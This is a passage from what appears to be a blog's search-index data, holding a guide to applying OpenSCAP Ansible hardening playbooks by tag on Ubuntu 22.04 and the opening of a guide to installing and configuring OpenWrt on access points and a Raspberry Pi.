^[\\s]*kernel.randomize_va_space\n        replace: '#kernel.randomize_va_space'\n      loop: '{{ find_sysctl_d.files }}'\n      when: ansible_virtualization_type not in [\"docker\", \"lxc\", \"openvz\", \"podman\", \"container\"]\n      tags:\n      - DISA-STIG-UBTU-22-213020\n      - NIST-800-171-3.1.7\n      - NIST-800-53-CM-6(a)\n      - NIST-800-53-SC-30\n      - NIST-800-53-SC-30(2)\n      - PCI-DSS-Req-2.2.1\n      - PCI-DSSv4-3.3.1.1\n      - disable_strategy\n      - low_complexity\n      - medium_disruption\n      - medium_severity\n      - reboot_required\n      - sysctl_kernel_randomize_va_space\n</code></pre> <p>Tags here are as broad as the policy this task could apply to (e.g. <code>DISA-STIG-UBTU-22-213020</code>), and as specific as the task itself (<code>sysctl_kernel_randomize_va_space</code>). Knowing this, we could execute tasks in a remediation script systematically. This is the least overwhelming approach to begin testing a policy.</p> <p>For example, execute all tasks that are <code>low_complexity</code>:</p> <pre><code>ansible-playbook -i \"localhost,\" -c local -b --ask-become-pass ./remediate.yml --tags low_complexity\n</code></pre> <p>Or just execute tasks related to the setting itself; <code>sysctl_kernel_randomize_va_space</code>:</p> <pre><code>ansible-playbook -i \"localhost,\" -c local -b --ask-become-pass ./remediate.yml --tags sysctl_kernel_randomize_va_space\n</code></pre> <p>Or avoid tasks that require a reboot:</p> <pre><code>ansible-playbook -i \"localhost,\" -c local -b --ask-become-pass ./remediate.yml --skip-tags reboot_required\n</code></pre> <p>The easiest way to do things is with a <code>tags.txt</code> file. For readability you could even write the file with each tag on a newline, and comment <code>#</code> out tags you don't want to use. The trick is parsing this file using command substitution. So for example, take this tags.txt file:</p> <pre><code># tags.txt\nsysctl_net_ipv4_tcp_syncookies\n#sysctl_fs_protected_symlinks\nsysctl_fs_suid_dumpable\nsysctl_kernel_randomize_va_space\n</code></pre> <p>Parse it with the following command:</p> <pre><code>grep -Pv \"^#\" &lt; tags.txt | tr '\\n' ','\n</code></pre> <ul> <li><code>grep -Pv \"^#\"</code> removes any commented lines</li> <li><code>tr '\\n' ','</code> translates the newlines into commas</li> </ul> <p>Run the playbook while loading the comma separated list of tags with:</p> <pre><code>ansible-playbook -i \"localhost,\" -c local -b --ask-become-pass scap-security-guide-0.1.73/ansible/ubuntu2204-playbook-standard.yml --tags $(grep -Pv \"^#\" &lt; tags.txt | tr '\\n' ',')\n</code></pre> <p>Doing this will give you full control over exactly what settings to maintain for really any system. You only need to maintain the list of tags to apply with <code>--tags</code> and the list to ignore through <code>--skip-tags</code>. These tags are consistent through each SCAP content release, so when a new version is released for an operating system and SCAP file, reuse the same commands to obtain and apply those tags.</p>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#extracting-all-tags","title":"Extracting All Tags","text":"<p>To extract all tags from a playbook, into a list of one tag per line:</p> <pre><code>ansible-playbook scap-security-guide-0.1.73/ansible/ubuntu2204-playbook-standard.yml --list-tags 2&gt;&amp;1 | grep 'TASK TAGS' | sed -E 's/^\\s+TASK TAGS://g' | sed -E 's/, /,/g' | sed -E 's/ \\[//g' | sed -E 's/\\]$//g' | tr ',' '\\n' | tee tags.txt\n</code></pre> <p>To extract all tags from all policies based on your system (e.g. Fedora, or Ubuntu):</p> <pre><code>#!/bin/bash\n# get-tags.sh\ncontent_path='scap-security-guide-0.1.73/ansible/'\nsource /etc/os-release\ncd \"$content_path\"\nfor playbook in ./*\"${ID}\"*.yml;\ndo\n    ansible-playbook \"$playbook\" --list-tags 2&gt;&amp;1 | grep 'TASK TAGS' | sed -E 's/      TASK TAGS://g' | sed -E 's/, /,/g' | sed -E 's/ \\[//g' | sed -E 's/\\]$//g' | tr ',' '\\n'\ndone | tee tags.txt.tmp &gt;/dev/null\nsort &lt; tags.txt.tmp | uniq | tee tags.txt &gt;/dev/null\nrm tags.txt.tmp\n</code></pre>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#using-lists-of-tags","title":"Using Lists of Tags","text":"<p>In some cases, policies will share the same tag (basically they both have the same rule). In other cases, you're pulling tags from multiple policies. In that case, make note of each policy you want to apply tags from because you'll need to run your list of tags against each of those playbooks.</p> <p>There are two ways to look at tags. First, what I will call \"meta\" tags, that define a set of changes. For example tags such as <code>PCI-DSSv4-10.2.1</code>, <code>disable_strategy</code>, or <code>low_disruption</code> include multiple rules and changes. The tag itself implies the types of changes it will be making or the policy it's adhearing to.</p> <p>Some examples of \"meta\" tags that should be generally safe to call (you should still review and test them individually):</p> <pre><code>disable_strategy\nenable_strategy\nlow_complexity\nlow_disruption\nno_reboot_needed\n</code></pre> <p>Alternatively, (and what I argue is the more robust way) since you're already having to review every single change for effectiveness, determine which rules you want to apply and reference them by their individual tag.</p> <p>The following list includes general hardening rules that I've slowly added to over time, and have had in place on all my systems, desktop or server (when applicable) since Ubuntu 18.04. I previously maintained these with interactive scripts, which became harder to update or scale, and is ultimately what prompted the writing of this guide. These systems were used for various tasks such as virtualization, development, VPN servers, general usage (web browsing, conferencing, office document creation, content creation) and even Kali Linux for general security testing.</p> <pre><code>coredump_disable_backtraces\ncoredump_disable_storage\ngrub2_enable_iommu_force\nkernel_module_cramfs_disabled\nkernel_module_freevxfs_disabled\nkernel_module_hfs_disabled\nkernel_module_hfsplus_disabled\nkernel_module_jffs2_disabled\nkernel_module_rds_disabled\nkernel_module_tipc_disabled\nkernel_module_udf_disabled\npackage_bind_removed\npackage_cups_removed\npackage_cyrusimapd_removed\npackage_dhcp_removed\npackage_dovecot_removed\npackage_httpd_removed\npackage_inetutilstelnetd_removed\npackage_netsnmp_removed\npackage_nfskernelserver_removed\npackage_nginx_removed\npackage_nis_removed\npackage_ntpdate_removed\npackage_openldapclients_removed\npackage_openldapservers_removed\npackage_rpcbind_removed\npackage_rsh_removed\npackage_samba_removed\npackage_squid_removed\npackage_talk_removed\npackage_telnetd_removed\npackage_telnetdssl_removed\npackage_telnet_removed\npackage_vsftpd_removed\npackage_xinetd_removed\nservice_apport_disabled\nservice_avahidaemon_disabled\nservice_cups_disabled\nservice_kdump_disabled\nservice_timesyncd_enabled\nsysctl_fs_protected_hardlinks\nsysctl_fs_protected_symlinks\nsysctl_fs_suid_dumpable\nsysctl_kernel_dmesg_restrict\nsysctl_kernel_randomize_va_space\nsysctl_net_ipv4_conf_all_accept_redirects\nsysctl_net_ipv4_conf_all_accept_source_route\nsysctl_net_ipv4_conf_all_log_martians\nsysctl_net_ipv4_conf_all_rp_filter\nsysctl_net_ipv4_conf_all_secure_redirects\nsysctl_net_ipv4_conf_all_send_redirects\nsysctl_net_ipv4_conf_default_accept_redirects\nsysctl_net_ipv4_conf_default_accept_source_route\nsysctl_net_ipv4_conf_default_log_martians\nsysctl_net_ipv4_conf_default_rp_filter\nsysctl_net_ipv4_conf_default_secure_redirects\nsysctl_net_ipv4_conf_default_send_redirects\nsysctl_net_ipv4_icmp_echo_ignore_broadcasts\nsysctl_net_ipv4_icmp_ignore_bogus_error_responses\nsysctl_net_ipv4_ip_forward\nsysctl_net_ipv4_tcp_syncookies\nsysctl_net_ipv6_conf_all_accept_ra\nsysctl_net_ipv6_conf_all_accept_redirects\nsysctl_net_ipv6_conf_all_accept_source_route\nsysctl_net_ipv6_conf_all_forwarding\nsysctl_net_ipv6_conf_default_accept_ra\nsysctl_net_ipv6_conf_default_accept_redirects\nsysctl_net_ipv6_conf_default_accept_source_route\n</code></pre> <p>Tags in that list appear frequently throughout all of the security polices. Looking at an easy to read list like this will help you apply hardening to a system based on what you want. One example is if you're building an nginx server, comment out the line <code>package_nginx_removed</code>. Similarly if you have a personal workstation and need to print frequently, you'll want to comment <code>package_cups_removed</code> and <code>service_cups_disabled</code>.</p> <p>To obtain tags from other (or future) policies, just use the previously mentioned <code>get-tags.sh</code> section to generate your own list.</p>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#test-policies-via-tags","title":"Test Policies via Tags","text":"<p>Let's take the CIS L2 Workstation benchmark. This has numerous changes that could take a long time if not properly tested and manually configured (anything related to <code>aide</code>) or break the system entirely. Using <code>ansible-playbook</code>'s <code>-C</code> and <code>-D</code> to check and diff the changes, we can walk through a \"dry run\" until all of the tasks we have tags specified for execute, showing us exactly what will change.</p> <p>Since <code>aide</code> causes problems up front, we'll search the remediation playbook for any tasks related to <code>aide</code>, and add each task's tag as an argument to <code>--skip-tags</code>.</p> <pre><code>ansible-playbook -i \"localhost,\" -c local -b --ask-become-pass ./remediate.yml --tags low_complexity,low_disruption --skip-tags aide_build_database,aide_check_audit_tools -D -C\n</code></pre> <p>NOTE: This may result in an infinite loop, leaving you to <code>ctrl+c</code> out of the dry run. Running this play without <code>-C -D</code> will set all of the changes, again potentially ending in an infiite loop to <code>ctrl+c</code> out of. This may be specific to this version of this policy, but these types of things can happen, which is why these policies need tested.</p> <p>Reboot to apply any changes that require it.</p> <p>Review and Repeat</p> <p>Now you can scan the system again, saving separate results files for comparison to the originals. Filter down the html report by <code>failed</code> and <code>severity</code> to prioritize your next steps. In some cases, tasks simply do not make the changes they intend to make, and you must plan to do those manually (most of the <code>auditd</code> tasks). In others, the change has been made but isn't being read. Reviewing the html reports will always be necessary when baselining a new system, but once you determine what must be applied manually or by Ansible, you can repate these steps as needed.</p> <p>Generally, anything needing a site specific configuration like <code>aide</code> or <code>auditd</code> may benefit from be configured separately from these policies. The same goes for repartitioning drives, these policies will not attempt to do this for you. Whether this means writing your own anisble roles for these items or similar, is up to you.</p> <p>The following section walks through applying a standard profile to Ubuntu 22.04. This may be helpful as practice if you were lost in the last example.</p>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#rules-without-ansible-tasks","title":"Rules Without Ansible Tasks","text":"<p>Some rules simply have no Ansible tasks to apply them. It's also possible a task continues to fail during a play. In both cases you will have to use a bash remediation script.</p> <p>Take the auditd rules for the CIS L2 workstation benchmark on Ubuntu 22.04 as an example. These Ansible tasks may fail, resulting in an endless loop when running the playbook. You will need to resolve this manually, either on the command line, or with the SCAP Workbench GUI tool (install via <code>dnf</code> on Fedora, or compile from source on Ubuntu).</p> <p>Related rules are often grouped together in policy files, but not always. Whether you're using the prebuilt bash scripts that ship with ComplianceAsCode/content, a remediation script you created using <code>oscap</code>, or building a custom profile in SCAP Workbench, the same technique applies.</p> <p>The following approach tries to mimic what we've been doing using Ansible tags.</p> <p>NOTE: Rules in bash remediation scripts can't be easily referenced in groups by name, type, or policy, in the way that they can be by tags in Ansible playbooks.</p>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#customize-with-scap-workbench","title":"Customize with SCAP Workbench","text":"<p>You can customize profiles for any policy from the Workbench GUI.</p> <ul> <li><code>sudo dnf install -y scap-workbench</code> on Fedora or compile from source</li> <li>Run SCAP Workbench, select the main <code>Profile</code> you're targeting from the Profile drop down menu</li> <li>To the right of the <code>Profile</code> drop down menu, click the <code>Customize</code> button</li> <li>You'll be prompted to name the profile, Click OK or change the custom profile name</li> <li>Click <code>Deselect all</code> at the top</li> <li>Use the search box to find all the rules you need and enable them by checking their boxes</li> <li>Click OK when you're done</li> <li>Now back on the main window, select the <code>Generate remediation role</code> drop down on the bottom left, choose <code>bash</code>, save it</li> <li>To save the customization profile, go to File &gt; Save Customization Only</li> </ul> <p>Run the remediation script with <code>sudo bash ./remediation.sh</code>.</p>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#customize-with-bash","title":"Customize with <code>bash</code>","text":"<p>List every rule matching <code>*rule_audit*</code>, which will also display the rule number as <code>(&lt;some-number&gt; / &lt;some-number&gt;)</code>:</p> <pre><code>grep -P \"BEGIN fix.+rule_audit.*$\" ./ubuntu2204-script-cis_level2_workstation.sh\n</code></pre> <ul> <li>Create a copy of the remediation script to edit</li> <li>Note the number of the first rule returned by <code>grep</code>, use that to find that line</li> <li>Delete everything before that line</li> <li>Do the same for the last rule's number, and everything after that line</li> <li>Check for any extra rules in between, remove them</li> </ul> <p>Run the remediation script with <code>sudo bash ./remediation.sh</code>.</p> <p>Using these methods in additon to tags to fill any gaps in policy coverage is a more manageable approach.</p> <p>Include the script in an Ansible role under <code>files/remediation-auditd.sh</code> or reference it in a playbook. It will be copied to each node and executed.</p> <p>In some cases it may make more sense to write your own reusable Ansible role or shell script you can use accross multiple machines to remedy the items that are missing. This is something I've found particularly useful with <code>aide</code> and <code>auditd</code>, as a better way to customize and manage them:</p> <ul> <li>Auditd Ansible role</li> <li>AIDE Ansible role</li> </ul>"},{"location":"blog/2024/05/29/material-file-document-arrow-right-openscap-practical-usage/#complete-walkthrough-of-a-policy","title":"Complete Walkthrough of a Policy","text":"<p>This section is to help those getting started.</p> <p>Lets configure the Standard System Security Profile for Ubuntu 22.04, and make any necessary adjustments to prevent the system from breaking.</p> <p>Obtain the <code>Id</code> for the \"Standard System Security Profile for Ubuntu 22.04\":</p> <pre><code>oscap info scap-security-guide-0.1.73/ssg-ubuntu2204-ds-1.2.xml\n</code></pre> <p>Assuming you're using a virtual machine to run these tests, with Ansible installed, and the open-scap content GitHub release downloaded, take a snapshot.</p> <p>The working directory here is <code>~/src</code>, with your SCAP content extracted to <code>~/src/scap-security-guide-0.1.73/</code>.</p> <p>Start by scanning the system in its default state, and writing the results to a file:</p> <pre><code>#!/bin/bash\nresults_path='/home/user/src/results.xml'\nreport_path='/home/user/src/report.html'\nprofile_id='xccdf_org.ssgproject.content_profile_standard'\nssg_data_file='/home/user/src/scap-security-guide-0.1.73/ssg-ubuntu2204-ds-1.2.xml'\noscap xccdf eval --profile \"$profile_id\" --results-arf \"$results_path\" --report \"$report_path\" \"$ssg_data_file\"\n</code></pre> <p>Get the <code>Id</code> from the results file:</p> <pre><code>oscap info /home/user/src/results.xml | grep 'Result ID:' | awk '{print $3}'\n</code></pre> <p>Generate a remedation playbook:</p> <pre><code>#!/bin/bash\nresults_file='/home/user/src/results.xml'\nresult_id='xccdf_org.open-scap_testresult_xccdf_org.ssgproject.content_profile_standard'\nfix_type='ansible'\nremediation_file='/home/user/src/remediate.yml'\noscap xccdf generate fix --fix-type \"$fix_type\" --output \"$remediation_file\" --result-id \"$result_id\" \"$results_file\"\n</code></pre> <p>Now that we have a playbook made based on our system's current state, let's look at the tags in some of the tasks. We can see two interesting tags that may be a good place to start:</p> <ul> <li><code>low_complexity</code></li> <li><code>low_disruption</code></li> </ul> <pre><code>nano remediation.yml\n&lt;SNIP&gt;\n - hosts: all\n   vars:\n      var_sshd_set_keepalive: !!str 0\n   tasks:\n    - name: Gather the package facts\n      package_facts:\n        manager: auto\n      tags:\n      - NIST-800-53-CM-6(a)\n      - PCI-DSS-Req-10.7\n      - configure_strategy\n      - ensure_logrotate_activated\n      - low_complexity \u2b50\n      - low_disruption \u2b50\n      - medium_severity\n      - no_reboot_needed\n&lt;SNIP&gt;\n</code></pre> <p>Ansible has two great options for applying policies through playbooks, the <code>--check</code> (<code>-C</code>) and <code>--diff</code> (<code>-D</code>) options. Ansible will read a playbook, and try to tell us what changes will occur when executing that playbook.</p> <pre><code>ansible-playbook -i \"localhost,\" -c local -b --ask-become-pass ./remediate.yml --tags lowcomplexity,low_disruption --check --diff\n</code></pre> <p>Review the results for anything interesting or unexpected.</p> <p>With a VM snapshot taken, now apply all tasks in the playbook matching those tags:</p> <pre><code>\u2514\u2500$ ansible-playbook -i \"localhost,\" -c local -b --ask-become-pass ./remediate.yml --tags lowcomplexity,low_disruption\nBECOME password:\n\nPLAY [all] *********************************************************************************************************\n\nTASK [Gathering Facts] *********************************************************************************************\n\nok: [localhost]\n\n&lt;SNIP&gt;\n\nTASK [Remove parameter from files in /etc/ssh/sshd_config.d] *******************************************************\nchanged: [localhost] =&gt; ...\n\nTASK [Insert correct line to /etc/ssh/sshd_config.d/01-complianceascode-reinforce-os-defaults.conf] ****************\nchanged: [localhost]\n\n&lt;SNIP&gt;\n\nTASK [Remove parameter from files in /etc/ssh/sshd_config.d] *******************************************************\nchanged: [localhost] =&gt; ...\n\nTASK [Insert correct line to /etc/ssh/sshd_config.d/00-complianceascode-hardening.conf] ****************************\nchanged: [localhost]\n\n&lt;SNIP&gt;\n\nTASK [Ensure auditd is installed] **********************************************************************************\nok: [localhost]\n\nPLAY RECAP *********************************************************************************************************\nlocalhost                  : ok=23   changed=4    unreachable=0    failed=0    skipped=2    rescued=0    ignored=0\n</code></pre> <p>You'll notice if you run this multiple times, 4 tasks will continue to return \"changed\", while everything else returns as \"ok\". Investigating the files mentioned in the tasks, we can verify the changes were set correctly:</p> <pre><code>$ sudo su -\nroot@ubuntu2204:~# cd /etc/ssh/sshd_config.d/\nroot@ubuntu2204:/etc/ssh/sshd_config.d# ls -l\ntotal 8\n-rw-r--r-- 1 root root 19 May 27 02:58 00-complianceascode-hardening.conf\n-rw-r--r-- 1 root root 24 May 27 02:58 01-complianceascode-reinforce-os-defaults.conf\nroot@ubuntu2204:/etc/ssh/sshd_config.d# cat ./*\nPermitRootLogin no\nPermitEmptyPasswords no\n</code></pre> <p>This is just how Ansible works. It will always write to files in some cases, but this behavior should ensure the files are in the correct state every time it writes to them. We can safely proceed with applying more of the policy.</p> <p>Next we'll check tasks for tags <code>configure_strategy</code> and <code>ensure_logrotate_activated</code>:</p> <pre><code>$ ansible-playbook -i \"localhost,\" -c local -b --ask-become-pass ./remediate.yml --tags configure_strategy,ensure_logrotate_activated -D -C\nBECOME password:\n\n&lt;SNIP&gt;\n\nPLAY RECAP ********************************************************************************************************\nlocalhost                  : ok=6    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0\n</code></pre> <p>All 6 tasks are already \"ok\".</p> <p>Let's try checking tasks tagged as <code>medium_severity</code>:</p> <pre><code>ansible-playbook -i \"localhost,\" -c local -b --ask-become-pass ./remediate.yml --tags medium_severity -D -C\n</code></pre> <p>You should see some overlap between these results and what we've already executed; nothing that should break the system. Go ahead and apply all tasks with this tag.</p> <p>At this point the system should pass (nearly) all checks for the Standard System Security Profile. Feel free to apply the entire remediation playbook.</p> <pre><code>\u2514\u2500$ ansible-playbook -i \"localhost,\" -c local -b --ask-become-pass ./remediate.yml\nBECOME password:\n\n&lt;SNIP&gt;\n\nPLAY RECAP ********************************************************************************************************\nlocalhost                  : ok=26   changed=6    unreachable=0    failed=0    skipped=2    rescued=0    ignored=0\n</code></pre> <p>Finally, scan the system again, changing the output file names from <code>results</code> to <code>results-fixed</code> so we don't overwrite the original results:</p> <pre><code>#!/bin/bash\nresults_path='/home/user/src/results-fixed.xml'\nreport_path='/home/user/src/report-fixed.html'\nprofile_id='xccdf_org.ssgproject.content_profile_standard'\nssg_data_file='/home/user/src/scap-security-guide-0.1.73/ssg-ubuntu2204-ds-1.2.xml'\noscap xccdf eval --profile \"$profile_id\" --results-arf \"$results_path\" --report \"$report_path\" \"$ssg_data_file\"\n</code></pre> <p>Change ownership of the remediated html files to your non-root user, to open in Firefox.</p> <pre><code>sudo chown $USER:$USER ~/src/*.html\n</code></pre> <p>If you have a \"default\" install of an Ubuntu VM, you'll likely be failing the \"Disk Partitioning\" checks, which is fine since this needs addressed manually. These playbooks will not attempt to fix certain things as critical as disk partitions. Additionally you may also be failing the \"Set SSH Client Alive Interval\". Both of these can be investigated further now that you've narrowed down what needs addressed outside of the playbook.</p> <p>Conclusion</p> <p>This was an easy example, but the same process applies to the larger policies. Tags shoud help reduce maintenance and debugging time when applying SCAP content, and being a part of Anisble means this method can scale with your inventory and operating systems.</p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/","title":"OpenWrt","text":"<p>This guide includes details for installing and running OpenWrt on UniFi AP's as well as Raspberry Pis and even as a virtual machine.</p> <p>Because it's so flexible in its deployment, there are examples for different use cases included. For instance Tailscale can be leveraged for easy remote administration from anywhere including your mobile device thanks to the Web UI if that's important to you. Generally this guide approaches OpenWrt as a way to provide WiFi to networks where pfSense (or another upstream device) is the primary firewall router.</p> <p>There's a detailed list of reference links at the top to keep in mind as you read through, and each step tries to include useful copy-and-paste ready commands for operations you may need to repeat every time you go through the process being described.</p> <p>This file is originally from straysheep-dev/linux-configs.</p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#references","title":"References","text":"<ul> <li> <p>Essentials</p> <ul> <li>https://firmware-selector.openwrt.org/</li> <li>https://openwrt.org/advisory/start (Security advisories)</li> <li>https://openwrt.org/toh/ubiquiti/unifiac</li> <li>https://openwrt.org/toh/raspberry_pi_foundation/raspberry_pi</li> <li>https://openwrt.org/docs/guide-user/security/signatures</li> <li>https://openwrt.org/docs/guide-user/installation/ar71xx.to.ath79</li> <li>https://openwrt.org/docs/guide-user/installation/sysupgrade.cli</li> <li>https://openwrt.org/docs/guide-user/troubleshooting/backup_restore</li> <li>https://openwrt.org/docs/guide-user/troubleshooting/failsafe_and_factory_reset</li> </ul> </li> <li> <p>UCI CLI Interface</p> <ul> <li>https://openwrt.org/docs/guide-user/base-system/uci</li> </ul> </li> <li> <p>Wireless</p> <ul> <li>https://openwrt.org/docs/guide-user/network/wifi/basic</li> <li>https://openwrt.org/docs/guide-user/network/wifi/guestwifi/configuration_command_line_interface</li> <li>https://openwrt.org/docs/guide-user/network/wifi/guestwifi/guest-wlan</li> <li>https://openwrt.org/docs/guide-user/network/wifi/guestwifi/guestwifi_dumbap</li> </ul> </li> <li> <p>Downloading</p> <ul> <li>https://downloads.openwrt.org/releases/</li> <li><code>https://downloads.openwrt.org/releases/&lt;version&gt;/targets/&lt;target&gt;/&lt;type&gt;</code></li> </ul> </li> <li> <p>Flashing</p> <ul> <li>etcher</li> <li>rufus</li> </ul> </li> <li> <p>Virtualization</p> <ul> <li>https://openwrt.org/docs/guide-user/virtualization/vmware</li> <li>https://openwrt.org/docs/guide-user/virtualization/virtualbox-vm</li> </ul> </li> <li> <p>Networking</p> <ul> <li>https://openwrt.org/docs/guide-quick-start/checks_and_troubleshooting</li> <li>https://openwrt.org/docs/guide-user/base-system/basic-networking</li> <li>https://openwrt.org/docs/guide-user/network/routing/routes_configuration</li> <li>https://openwrt.org/docs/guide-user/base-system/dhcp</li> <li>https://openwrt.org/docs/guide-user/base-system/dhcp_configuration</li> </ul> </li> <li> <p>Changes regarding <code>ifname</code> -&gt; <code>device</code>:</p> <ul> <li>https://forum.openwrt.org/t/mini-tutorial-for-dsa-network-config/96998</li> <li>https://openwrt.org/docs/guide-user/network/dsa/converting-to-dsa</li> <li>https://openwrt.org/docs/guide-user/network/dsa/dsa-mini-tutorial</li> </ul> </li> <li> <p>Logging</p> <ul> <li>https://openwrt.org/docs/guide-user/perf_and_log/log.messages</li> </ul> </li> <li> <p>UEFI / SecureBoot</p> <ul> <li>https://openwrt.org/docs/guide-developer/uefi-bootable-image</li> </ul> </li> </ul>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#openwrt-wiki-license","title":"OpenWrt Wiki License:","text":"<ul> <li>https://creativecommons.org/licenses/by-sa/4.0/deed.en</li> </ul>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#factory-reset","title":"Factory Reset","text":"<ol> <li>Power on the device</li> <li>Hold reset button for 10 seconds</li> <li>Release the reset button</li> <li>Allow device to fully reboot</li> </ol>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#connecting","title":"Connecting","text":"<p>Connect to the device at OpenWrt's default: <code>ssh -p 22 root@192.168.1.1</code></p> <p>1) Note that you'll likely need to manually reconfigure your machine's network interface to be an ip address on 192.168.1.0/24 using a GUI, <code>ifconfig</code> or <code>ip</code>    2) Use <code>sudo systemctl restart network-manager.service</code>    3) On Windows, you can do this via the network configuration GUI    4) You can still use your host's existing WiFi connection for internet while working on the OpenWrt device via ethernet</p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#troubleshoot-connecting","title":"Troubleshoot Connecting","text":"<p>If you have issues connecting, try factory resetting the OpenWrt device again while it's still connected to your PC.</p> <p>Also try restarting the PC you're managing the device from.</p> <p>Alternatively walk through the steps below.</p> <p><pre><code># Try this first\nsudo systemctl restart network-manager.service\n# Check to see if you were assigned an IP in the 192.168.1.x/24 range\nip a\n\n# If not, continue below\n\n# Run tcpdump in one window\nsudo tcpdump -i eth0 -n -vv\n# Optionally run with -Q in to ignore outbound packets, only looking at packets inbound to your PC\nsudo tcpdump -i eth0 -n -vv -Q in\n\n# Manage interface configuration in another window\nip address flush dev eth0 scope global\nip address add dev eth0 192.168.1.12/24 broadcast 192.168.1.255 scope global noprefixroute\n\n# This line may fail, if it does skip it\nip route add default via 192.168.1.1 dev eth0\n\n# This may reset your interface address from the ip command, if it does, repeat those steps then skip this step\nsudo systemctl restart network-manager.service\n\n# Once you have assigned an IP in the 192.168.1.x range to your interface, scan locally with nmap:\nnmap -n -Pn -sT -p22 -e ethX 192.168.1.0/24 --open\n</code></pre> From here continue to watch the output from <code>tcpdump</code>, see what the device is doing and adjust accordingly</p> <p>When in doubt, factory reset the device, restart your PC, and then attempt a new connection by manually assigning your host's ethernet connection an IP in the 192.168.1.x/24 range, and trying to <code>ssh root@192.168.1.1</code>.</p>"},{"location":"blog/2024/05/07/simple-openwrt-openwrt/#installing-openwrt-on-a-raspberry-pi-4b","title":"Installing OpenWrt on a Raspberry Pi 4B:","text":"<p>\u26a0\ufe0f This section is still under construction, check back later! \u26a0\ufe0f</p> <p>The Pi 4B (and assumably later models) can boot from a USB device. If you're using an SD card some of these steps aren't necessary. You may also have to use a Raspbian live OS to make unique changes or updates. It's also suggested to use an external wireless adapter (ideally an ALFA card). Finally, this guide will walk through configuring a bridged AP, meant to replace an existing one.</p> <p>Wireless Card Limitations</p> <p>Virtual AP functionality, or creating multiple ESSIDS tied to the same wireless radio, can be limited depending on 1) if the card supports it, and 2) if OpenWrt has a kernel driver that can use the functionality.</p> <p>The Country Code Issue</p> <p>To get OpenWrt's WiFi working on a Raspberry Pi, you may need to boot into a Raspbian OS environment to set the country code. According to numerous posts on the OpenWrt forum, Raspbian writes this to a special non volatile place in memory, that 1) persists, and 2) OpenWrt cannot write to.</p> <p>Before starting, flash a copy of Raspbian onto the USB drive, boot into a live environment, set the country code, and then proceed.</p> <ul> <li>Raspbian OS Download Links</li> <li>Download Archive (with .sig and .sha256 files)</li> </ul> <p>Once you choose which image download you want (e.g. \"Raspberry Pi OS (64-bit)\") follow the <code>Archive</code> link beneath where you see \"Download\" and \"Download Torrent\" to find snapshots by date. Each folder contains a <code>.sig</code> and <code>.sha256</code> file for integrity checking. Keep in mind the <code>.sig</code> actually verifies the compressed <code>.img.xz</code> file, NOT the <code>.sha256</code> file.</p> <pre><code>gpg --verify 2024-07-04-raspios-bookworm-arm64.img.xz.sig 2024-07-04-raspios-bookworm-arm64.img.xz\nsha256sum -c 2024-07-04-raspios-bookworm-arm64.img.xz.sha256 --ignore-missing\n</code></pre> <p>Use Raspberry Pi Imager, etcher, or rufus to flash the img.xz file to the USB drive. Fix the country code with:</p> <pre><code>sudo raspi-config\n# Navigate to localisation options\n# Choose \"L4 WLAN Country\" to set the country code\n# See: https://www.raspberrypi.com/documentation/computers/configuration.html#wlan-country\n#\n# You should also update the bootloader while you're here\n# Advanced &gt; Bootloader Version &gt; Latest\n# sudo reboot\n# See: https://www.raspberrypi.com/documentation/computers/raspberry-pi.html#raspi-config\n</code></pre> <p>Poweroff the Pi, preparing next to flash the USB with OpenWrt and proceed with the remaining steps.</p> <p>Flash / Install</p> <ul> <li>Browse to https://firmware-selector.openwrt.org/</li> <li>Type the name of your device, e.g. \"Raspberry Pi 4B\"</li> <li>Use the folder icon to navigate to the download server where the signatures and checksums are hosted</li> <li>Download the <code>imagename-factory.img.gz</code>, the <code>sha256sums</code>, and the gpg signed <code>sha256sums.asc</code> files</li> <li>Balena (on Windows) can easily flash the <code>.img.gz</code> file to a USB drive (you can also use <code>dd</code> from a *nix host)</li> <li>Mount the USB filesystem after flashing (disconnect / reconnect the USB device on Windows)</li> <li>Modify the <code>cmdline.txt</code> in the root of the USB drive to have <code>root=/dev/sdaX</code> where <code>X</code> relates to the USB port on the Pi<ul> <li>Top USB port is <code>sda1</code></li> <li>Bottom USB port is <code>sda2</code></li> <li>See this commit for details</li> </ul> </li> </ul> <p>Example <code>cmdline.txt</code></p> <pre><code>console=serial0,115200 console=tty1 root=/dev/sda2 rootfstype=squashfs,ext4 rootwait\n</code></pre> <p>Connect (to Pi)</p> <ul> <li>If you have an external display attached, after a successful boot press <code>[Enter]</code> for a root shell</li> <li>You can also connect an external laptop via LAN / ethernet cable, and browse to or <code>ssh -L 127.0.0.1:8080:127.0.0.1:80 root@192.168.1.1</code></li> <li>By default, OpenWrt does not expose itself over WLAN (WiFi) until it's configured</li> </ul> <p>Connect (Pi to Network)</p> <p>Now you'll need to connect the Pi itself to the internet somehow, to install necessary packages.</p> <p>Option 1: Use the built-in Ethernet</p> <p>If you have a keyboard and monitor attached to the Pi, or can reach the Pi over SSH from the same network, you can of course connect the Pi via an ethernet cable.</p> <p>Option 2: Use the built-in WiFi</p> <p>Credits &amp; Thanks</p> <p>Thanks to Network Chuck's video on setting up a Raspberry Pi as a travel VPN router. See the video instructions here.</p> <p>This section was built from the setup steps demonstrated in the video.</p> <p>Credit to this OpenWrt forum post on pointing to the correct drivers for the ALFA AWUS036ACM card.</p> <ul> <li>Change root's password with <code>passwd</code>, save it to your credential manager</li> <li>Set the web interface to only listen on 127.0.0.1 and ::1 in <code>/etc/config/uhttpd</code></li> <li> <p>Create a <code>wwan</code> device in <code>/etc/config/network</code> with only DHCP set</p> <pre><code>config interface 'wwan'\n        option proto 'dhcp'\n</code></pre> </li> <li> <p>Delete the existing AP config under <code>/etc/config/wireless</code> (we're not ready to be an AP yet)</p> </li> <li>Also under <code>/etc/config/wireless</code>, change <code>option disabled '1'</code> to <code>option disabled '0'</code> for the only device</li> 